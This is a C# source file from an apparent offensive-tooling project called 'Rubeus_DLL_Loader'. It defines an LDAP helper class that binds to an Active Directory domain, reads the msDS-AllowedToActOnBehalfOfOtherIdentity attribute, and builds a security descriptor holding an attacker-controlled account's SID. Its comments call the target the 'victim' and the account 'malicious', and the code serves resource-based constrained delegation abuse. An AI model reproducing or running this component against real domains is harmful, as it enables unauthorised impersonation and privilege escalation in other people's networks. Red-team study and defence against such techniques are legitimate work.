using System;
using System.DirectoryServices;
using System.Linq;
using System.Security.AccessControl;
using System.Security.Principal;

namespace Rubeus_DLL_Loader
{
    class LDAP
    {
        public DirectoryEntry entry;
        public DirectorySearcher searcher;

        /* 
         * Purpose:
         *   Constructor for the LDAP class assumes you are performing this from a domain joined machine with proper write permisions over the victim
         *   It adds the two properties to the searcher object so that they can be used in the rest of the code
         * Arguments:
         *   domain - Domain you want to bind to
         * Output: 
         *   LDAP object with predefined 
         */
        public LDAP(string domain)
        {
            entry = new DirectoryEntry(string.Format("LDAP://{0}", domain));
            searcher = new DirectorySearcher(entry);
            
            //Add the properties we care about here
            searcher.PropertiesToLoad.Add("msDS-AllowedToActOnBehalfOfOtherIdentity");
            searcher.PropertiesToLoad.Add("objectSid");
        }

        /* 
         * Purpose:
         *   Constructor for the LDAP class assumes you are performing this from a domain joined machine with proper write permisions over the victim
         *   This will allow you to bind with a specific account in mind
         *   It adds the two properties to the searcher object so that they can be used in the rest of the code
         * Arguments:
         *   domain - Domain you want to bind to
         * Output: 
         *   LDAP object with predefined 
         */
        public LDAP(string domain, string username, string password)
        {
            entry = new DirectoryEntry(string.Format("LDAP://{0}", domain), username, password);
            searcher = new DirectorySearcher(entry);

            //Add the properties we care about here
            searcher.PropertiesToLoad.Add("msDS-AllowedToActOnBehalfOfOtherIdentity");
            searcher.PropertiesToLoad.Add("objectSid");
        }

        /*
         * Purpose:
         *   Wraper for the set filter item
         * Arguments:
         *   filter - LDAP syntax based filter
         * Output:
         *   n/a
         */
        public void set_filter(string filter)
        {
            searcher.Filter = filter;
        }

        /*
         * Purpose:
         *   Performs a transformation on SIDs to secruity descriptor using windows security descriptor strings to binary conversions
         *   This is required when setter the msds-allowedtodelegateonbehalf property and when comparing an existing property
         *   to our malicious accounts SID
         * Arguments:
         *   SID - Byte array containing the SID of the account you want to turn into a security descriptor
         * Output:
         *   Byte array containing the Security Descriptor with the SID baked in
         * 
         */
        public byte[] create_secruitydescriptor(byte[] SID)
        {
            //Perform Same Transformation required to set a msds-delegate attribute
            SecurityIdentifier target_si = new SecurityIdentifier(SID, 0);

            //Black magic that is windows seecurity descriptors
            String sec_descriptor = "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;" + target_si.ToString() + ")";
            System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_descriptor);
            byte[] descriptor_buffer = new byte[sd.BinaryLength];

            //Setting descriptor_buffer to the security descriptor binary form
            sd.GetBinaryForm(descriptor_buffer, 0);
            return descriptor_buffer;
        }

        /* Purpose:
         *   Function compares two security descriptors to see if they are equivalent
         *   it does a byte by byte comparison
         * Arguments:
         *   current - The security descriptor currently attached to the AD object
         *   target - The security descriptor you are comparing it against
         * Output:
         *   True - They are the same
         *   Fale - They are different
         */   
        public bool check_securitydescriptor_match(byte[] current, byte[] target)
        {
            byte[] descriptor_buffer = create_secruitydescriptor(target);

            //Checking equality 1 byte at a time
            return current.SequenceEqual(descriptor_buffer);
        }
    }
}
